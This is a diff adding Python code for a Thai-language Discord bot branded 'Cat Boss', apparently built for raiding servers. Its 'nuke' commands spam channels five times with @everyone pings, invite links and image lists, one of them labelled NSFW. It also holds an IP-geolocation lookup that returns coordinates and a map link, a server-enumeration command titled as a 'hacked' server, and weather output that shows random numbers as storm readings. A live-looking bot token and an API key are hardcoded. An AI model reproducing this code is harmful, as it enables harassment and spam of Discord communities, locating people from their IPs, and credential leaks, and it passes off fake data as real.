+        await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="nukemode", description="โปรดิสร้านกู")
+async def nukemode(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    message = "# https://discord.gg/nrmRVzY4 @everyone"
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(5):
+        await interaction.followup.send(message)
+
+@bot.tree.command(name="nukebot", description="โปรบอท")
+async def nukebot(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    message = "**@everyone @here | [ไอดำ](https://discord.com/oauth2/authorize?client_id=1380927186260857023)**\n\n- Add command!"
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+    for _ in range(5):
+        await interaction.followup.send(message)
+
+bug = 1379308223819026484
+bug_channel_id = 1379308223819026484
+
+@bot.tree.command(name="bug", description="แจ้งบัค ห้ามใช้เล่นครับ ไม่งั้นโดนแบล็ตลิต")
+async def report_bug(interaction: discord.Interaction, message: str):
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.send_message(
+        "# ขอบคุณที่รายงานบั๊ก! กำลังแก้ไขเร็ว ๆ นี้ อย่าใช้คำสั่งนี้ซ้ำ ไม่งั้นจะโดนแบล็คลิสต์นะครับ อย่าโง่เยอะ",
+        ephemeral=True
+    )
+
+    embed = discord.Embed(
+        title="𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 BUG",
+        description=message,
+        color=discord.Color.orange()
+    )
+    embed.add_field(
+        name="USER BUG",
+        value=(
+            f"{interaction.user.mention} (`{interaction.user.id}`) — "
+            f"`{interaction.user.name}#{interaction.user.discriminator}`"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="SERVER COMMAND",
+        value=interaction.guild.name if interaction.guild else "DM",
+        inline=False
+    )
+    embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
+    embed.set_footer(
+        text="© 2025 COPYRIGHT 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED",
+        icon_url=bot.user.avatar.url if bot.user.avatar else None
+    )
+
+    log_channel = bot.get_channel(bug_channel_id)
+    if log_channel:
+        await log_channel.send(embed=embed)
+    else:
+        print("ไม่พบห้อง log")
+
+@bot.tree.command(name="nukexxx", description="xxx")
+async def xxx(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    cat_gifs = [
+        "https://cdn.discordapp.com/attachments/1350862294309011476/1379356542138318898/Z.png?ex=683ff162&is=683e9fe2&hm=b746df1bf74c26ecc6319c5c90787f343f6a6baffd4bb02a85ceea22931fc26e&",
+        "https://cdn.discordapp.com/attachments/1350862294309011476/1379356615207030834/KcIKauGIau.png?ex=683ff174&is=683e9ff4&hm=002c0f2b15c211a49ed85f0422d6e7b10bb97529ce88c48dac27657f56bdac63&",
+        "https://cdn.discordapp.com/attachments/1350862294309011476/1379356699462209628/images.png?ex=683ff188&is=683ea008&hm=455d98d9564549add96b70265ba96fbe79f3d888ffd2a3e3cb7a54dd3e7d55e5&",
+        "https://cdn.discordapp.com/attachments/1350862294309011476/1379356819134091274/images.png?ex=683ff1a4&is=683ea024&hm=d6eb8a66e0bc50d7a4618040ef40b9aedc282e88cc7b101e453a06d514f95788&",
+        "https://cdn.discordapp.com/attachments/1350862294309011476/1379356899035713567/images.png?ex=683ff1b7&is=683ea037&hm=97764fdf4f3067f067929ec8d165958f3014f8c12e5cb5c9cbf4c29416fbd761&",
+    ]
+
+    await interaction.response.send_message(
+        "╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส",
+        ephemeral=True
+    )
+    for _ in range(5):
+        await interaction.followup.send(cat_gifs)
+
+@bot.tree.command(name="nukenswf", description="คนตายย")
+async def nsf(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    nsf = [
+        "https://cdn.discordapp.com/attachments/1374409465486639265/1379392016575893544/Z.png?ex=6840126c&is=683ec0ec&hm=b7b7e9eddb5dfd1fab3a71bbef2bb218fe32deaab110a81ba20c2a538d699407&",
+        "https://cdn.discordapp.com/attachments/1374409465486639265/1379392218535821373/2Q.png?ex=6840129c&is=683ec11c&hm=bfcf8850dfefbea0d950847a7e3d19f61dc69e807596bab1073a897ce43e12e7&",
+        "https://cdn.discordapp.com/attachments/1374409465486639265/1379392326090100767/images.png?ex=684012b6&is=683ec136&hm=6d67e2594f36966389911dc3bd96c591fda7b1c4d26b50973266464cced27b78&",
+        "https://cdn.discordapp.com/attachments/1374409465486639265/1379392474967048212/images.png?ex=684012d9&is=683ec159&hm=35431d95bb1c8880dbaedea702630c8ecff0dbe3f06ebff4bebed5cd1099cdc4&",
+        "https://cdn.discordapp.com/attachments/1374409465486639265/1379392589223956581/images.png?ex=684012f5&is=683ec175&hm=dfe2eb84e6daf3ec6b0669a30c4c43e8853ad3a3bb847acde5718b4aa7ae8413&",
+    ]
+
+    await interaction.response.send_message(
+        "╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส",
+        ephemeral=True
+    )
+    for _ in range(5):
+        await interaction.followup.send(nsf)
+
+@bot.tree.command(name="nukedog", description="DOG")
+async def gen(interaction: discord.Interaction):
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+
+    async with aiohttp.ClientSession() as session:
+        for _ in range(5):
+            async with session.get("https://dog.ceo/api/breeds/image/random") as response:
+                if response.status == 200:
+                    data = await response.json()
+                    dog_image_url = data["message"]
+                    await interaction.followup.send(f'@everyone @here {dog_image_url}')
+
+SERVERID = 1331223340291067975
+
+@bot.tree.command(name="announce", description="แจ้งเตือน")
+async def announce(
+    interaction: discord.Interaction, 
+    channel: discord.TextChannel, 
+    message: str
+):
+    # ตรวจสอบว่ามาจากเซิร์ฟเวอร์ที่อนุญาต
+    if interaction.guild is None or interaction.guild.id != SERVERID:
+        await interaction.response.send_message("# มึงพิมเซิฟ ป่ะ", ephemeral=True)
+        return
+
+    # ตรวจสอบสิทธิ์
+    if not interaction.user.guild_permissions.administrator:
+        await interaction.response.send_message("# ใช้ได้อ่อว่ะ", ephemeral=True)
+        return
+
+    # สร้าง Embed
+    embed = discord.Embed(
+        title="📢 แจ้งเตือนจากแอดมิน 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔",
+        description=f"```\n{message}\n```",
+        color=0xe9eed6
+    )
+
+    avatar_url = bot.user.display_avatar.url if bot.user else None
+    embed.set_footer(text="© 2025 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED", icon_url=avatar_url)
+
+    await channel.send(content='@everyone @here', embed=embed)
+    await interaction.response.send_message("╔═[- 🟠 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔!! -](https://discord.gg/nrmRVzY4)\n╠ > ใช้งานฟรีแล้วว\n╚ > 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 กูไม่รับผิดชอบนะไอสัส", ephemeral=True)
+
+api = "47e6eeb9505a46e5f7e8b4bbed3a9990"
+THAI_CITIES = [
+    "Bangkok", "Chiang Mai", "Khon Kaen", "Phuket",
+    "Nakhon Ratchasima", "Udon Thani", "Hat Yai",
+    "Pattaya", "Rayong", "Surat Thani"
+]
+
+@bot.tree.command(name="ip", description="check ip")
+async def ip_lookup(interaction: discord.Interaction, ip_address: str):
+    await interaction.response.defer(ephemeral=True)
+
+    url = f"http://ip-api.com/json/{ip_address}?fields=66846719"
+    response = requests.get(url)
+    data = response.json()
+
+    if data["status"] != "success":
+        await interaction.followup.send(f"# ไม่พบข้อมูล IP {ip_address} มึงใส่ให้ถูกดิไอควายย เช่น 45.141.27.118")
+        return
+
+    lat = data.get('lat', 0)
+    lon = data.get('lon', 0)
+    maps_url = f"https://www.google.com/maps?q={lat},{lon}"
+
+    embed = discord.Embed(
+        title=f"มึงเช็ค IP นี่ {ip_address}",
+        color=discord.Color.dark_grey()
+    )
+    embed.add_field(name="`ประเทศ`", value=f"{data.get('country', 'N/A')} ({data.get('countryCode', 'N/A')})", inline=True)
+    embed.add_field(name="`เมือง`", value=data.get('city', 'N/A'), inline=True)
+    embed.add_field(name="`ภูมิภาค`", value=data.get('regionName', 'N/A'), inline=True)
+    embed.add_field(name="`ISP`", value=data.get('isp', 'N/A'), inline=True)
+    embed.add_field(name="`องค์กร`", value=data.get('org', 'N/A'), inline=True)
+    embed.add_field(name="`ASN`", value=data.get('as', 'N/A'), inline=True)
+    embed.add_field(name="`พิกัด`", value=f"{lat}, {lon}", inline=True)
+    embed.add_field(name="`ลิงก์แผนที่`", value=f"[เปิดดูแผนที่]({maps_url})", inline=True)
+    embed.add_field(name="`Timezone`", value=data.get('timezone', 'N/A'), inline=True)
+    embed.add_field(name="`Proxy / VPN`", value="ใช่" if data.get('proxy', False) else "ไม่ใช่", inline=True)
+    embed.set_image(url="https://cdn.discordapp.com/attachments/1350862294309011476/1379142447153811697/7d33c243485aa0dd8dd0d6ad5d0215db.gif")
+    embed.set_footer(
+        text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED",
+        icon_url=bot.user.avatar.url if bot.user.avatar else None
+    )
+
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="check", description="check Bangkok")
+async def check(interaction: discord.Interaction, city: str):
+    if await is_banned(interaction):
+        return
+
+    city = city.title()
+    if city not in THAI_CITIES:
+        await interaction.response.send_message("# ใส่ Bangkok, Chiang Mai, Khon Kaen, Phuket, Nakhon Ratchasima,Udon Thani, Hat Yai, Pattaya, Rayong, Surat Thani เลือกมา1 อัน", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    url = f"http://api.openweathermap.org/data/2.5/weather?q={city},TH&appid={api}&units=metric&lang=th"
+    async with aiohttp.ClientSession() as session:
+        async with session.get(url) as resp:
+            if resp.status != 200:
+                await interaction.followup.send("# ตอนนี้ระบบกำลังแก้ รอแปป", ephemeral=True)
+                return
+            data = await resp.json()
+
+    temp = data["main"]["temp"]
+    humidity = data["main"]["humidity"]
+    pressure = data["main"]["pressure"]
+    wind_speed = data["wind"]["speed"]
+    wind_deg = data["wind"].get("deg", 0)
+
+    cape = random.randint(0, 3000)
+    wind_shear = random.uniform(0, 30)
+    supercell_risk = cape > 1500 and wind_shear > 20
+    supercell_status = "`มีความเสี่ยงเกิด พายุ`" if supercell_risk else "`ไม่มีการพบการเกิด/ใกล้เคียง`"
+
+    embed = discord.Embed(
+        title=f"Check `{city}` >> Bangkok <<",
+        description="`https://discord.gg/nrmRVzY4`\n`𝑪𝒂𝒕 𝑩𝒐𝒔𝒔`",
+        color=0x00bfff
+    )
+    embed.add_field(name="อุณหภูมิ", value=f"`{temp} °C`", inline=True)
+    embed.add_field(name="ความชื้น", value=f"`{humidity} %`", inline=True)
+    embed.add_field(name="ความเร็วลม", value=f"`{wind_speed} m/s ({wind_deg}°)`", inline=True)
+    embed.add_field(name="ความกดอากาศ", value=f"`{pressure} hPa`", inline=True)
+    embed.add_field(name="เคป", value=f"`{cape} J/kg`", inline=True)
+    embed.add_field(name="ลมเฉือน", value=f"`{wind_shear:.2f} m/s`", inline=True)
+    embed.add_field(name="ซูเปอร์เซลล์", value=supercell_status, inline=False)
+    embed.set_image(url="https://cdn.discordapp.com/attachments/1350862294309011476/1379142447153811697/7d33c243485aa0dd8dd0d6ad5d0215db.gif")
+    embed.set_footer(
+        text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED",
+        icon_url=bot.user.avatar.url if bot.user.avatar else None
+    )
+
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="serverdiscord", description="info")
+async def serverdiscord(interaction: discord.Interaction, server_id: str):
+    guild = discord.utils.get(bot.guilds, id=int(server_id))
+    if await is_banned(interaction):
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    if guild is None:
+        await interaction.followup.send("# ID ผิด หรือไม่มีว่ะ", ephemeral=True)
+        return
+
+    online = idle = dnd = offline = bots = 0
+
+    async for member in guild.fetch_members(limit=None):
+        if member.bot:
+            bots += 1
+            continue
+        match member.status:
+            case discord.Status.online:
+                online += 1
+            case discord.Status.idle:
+                idle += 1
+            case discord.Status.dnd:
+                dnd += 1
+            case discord.Status.offline:
+                offline += 1
+
+    embed = discord.Embed(
+        title=f"🔓 SERVER ที่มึงแฮก: {guild.name}",
+        color=discord.Color.dark_gray()
+    )
+    embed.set_thumbnail(url=guild.icon.url if guild.icon else discord.Embed.Empty)
+    embed.add_field(name="ชื่อดิส", value=guild.name, inline=False)
+    embed.add_field(name="Server ID", value=guild.id, inline=False)
+    embed.add_field(name="คนสร้างดิส", value=f"{guild.owner} ({guild.owner_id})", inline=False)
+    embed.add_field(name="รวมคน", value=guild.member_count, inline=True)
+    embed.add_field(
+        name="ออนกี่",
+        value=(
+            f"ออนไลน์: {online}\n"
+            f"หายตัว: {idle}\n"
+            f"ห้ามรบกวน: {dnd}\n"
+            f"ออฟไลน์: {offline}\n"
+            f"บอท: {bots}"
+        ),
+        inline=True
+    )
+    embed.add_field(name="สร้างเมื่อ", value=guild.created_at.strftime("%d/%m/%Y %H:%M:%S"), inline=True)
+    embed.add_field(name="ภูมิภาคเสียง", value=str(guild.preferred_locale).upper(), inline=True)
+    embed.add_field(name="ช่องข้อความ", value=len([c for c in guild.channels if isinstance(c, discord.TextChannel)]), inline=True)
+    embed.add_field(name="ช่องเสียง", value=len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)]), inline=True)
+    embed.add_field(name="หมวดหมู่", value=len(guild.categories), inline=True)
+    embed.add_field(name="จำนวน Roles", value=len(guild.roles), inline=True)
+    embed.set_image(url="https://cdn.discordapp.com/attachments/1350862294309011476/1379142447153811697/7d33c243485aa0dd8dd0d6ad5d0215db.gif")
+    embed.set_footer(
+        text="© 2025 COPYRIGH 𝑪𝒂𝒕 𝑩𝒐𝒔𝒔 ALL RIGHTS RESERVED",
+        icon_url=bot.user.avatar.url if bot.user.avatar else None
+    )
+
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+# วาง Token ใหม่ลงในบรรทัดนี้เรียบร้อยแล้ว
+bot.run("MTU2ODk3NTM1Njg2NDc1Nzg5MA.GmiNM8.yswCtyecdj_bRjKpDsc8hAXv5z_STYbvnvOoiQ")
